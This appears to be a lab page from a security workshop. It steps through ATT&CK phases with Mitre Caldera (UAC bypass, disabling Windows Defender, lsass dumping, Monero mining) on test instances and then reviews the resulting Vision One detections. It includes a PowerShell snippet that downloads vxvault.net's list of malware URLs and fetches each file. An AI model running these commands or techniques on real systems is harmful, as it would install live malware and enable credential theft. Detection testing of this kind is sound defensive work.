---
title: "Windows"
chapter: false
weight: 42
pre: "<b>4.2 </b>"
---
## Windows - Detection Mode
---

<b>Before you start this lab, make sure the C1WS Policy attached to the Windows Instance is the "demo > visionone > detection mode" policy.</b>

### ATT&CK Phases
#### Reconnaissance
This step was skipped because we know the target of our attack (Windows and Linux Instances)

---
#### Resource Development
We used Mitre Caldera to generate the payloads used to compromise our targets

---
#### Initial Access and Execution
We deployed the malicious payloads manually to the Windows and Linux Instances. In a Real-world scenario, we could have used a Malicious Email message, including the link to the malicious files. In this way, compromising the target computers.

---
#### Persistence
Using Mitre Caldera, you can deploy additional backdoors that will ensure you can keep accessing the affected computers in the future:

In our case, we can run a remote instruction on the affected Linux computer and deploy a secondary agent (bot).

{{< youtube id="ECAPmLFwiXY" >}}

---
#### Privilege Escalation
Using Mitre Caldera, you can deploy the Technique "UAC bypass registry (T1548.002) - Set a registry key to allow UAC bypass". It will help to to expand the impact of this attack and get additional permissions on the affected OS.

{{< youtube id="o-hCzQjhNLs" >}}

---
#### Defense Evasion
Using Mitre Caldera, you can deploy the Technique "Disable Windows Defender All (T1562.001) - Disable Windows Defender All".

{{< youtube id="w5pnVRvGS6k" >}}

---
#### Credential Access
Using Mitre Caldera, you can deploy the Technique "Leverage Procdump for lsass memory (T1003.001) - Dump lsass for later use with mimikatz". You may find sensitive information with this technique.

{{< youtube id="syO6uPBEhQc" >}}

---
#### Discovery
Using Mitre Caldera, you can deploy the Technique "Find System Network Connections (T1049) - Find System Network Connections". You may find additional targets for this attack (Lateral Movement for example).

{{< youtube id="ReflY0x4k5A" >}}

---
#### Lateral Movement
Under development..


---
#### Command & Control
You can use the same tatics used on the step "Persistence", or even using other customm tools to interact with the C&C Server.

---
#### Collection
Using Mitre Caldera, you can deploy the Technique "Find files (T1005) - Locate files deemed sensitive". Using this technique you can search for sensitive date hosted on the affected computers.

{{< youtube id="X2zpomhJNLo" >}}

---
#### Exfiltration
Under development..

---
#### Impact 1
Using Mitre Caldera, you can deploy the Techniques "Crypto (Monero) Mining (T1496) - Download and execute Monero miner (xmrig) for 1 minute" and "Leave note (T1491) - Create a text file for the user to find". With this two techniques, you can create an impact that will affect the performance and expose the affected server to other risks, and also leave a note to tell the target of the attack about your intentions and what you have done so far.

{{< youtube id="LDqfBhn0DyQ" >}}

---
#### Impact 2
Under development..

        New-Item -Path c:\tmp -ItemType Directory;
        Invoke-WebRequest http://vxvault.net/URL_List.php -OutFile c:\tmp\urls.txt;
        Set-Location -Path c:\tmp;
        foreach($line in Get-Content c:\tmp\urls.txt) {Invoke-WebRequest -Uri $line -OutFile $(Split-Path -Path $line -Leaf)}

---
## Reviewing the Detections 
Review your Vision One Portal (Risk Insights and XDR / Workbenchs and OAT) searching for the evidences of the instructions executed during this demo.

{{< youtube id="A-mIm0YG-OM" >}}

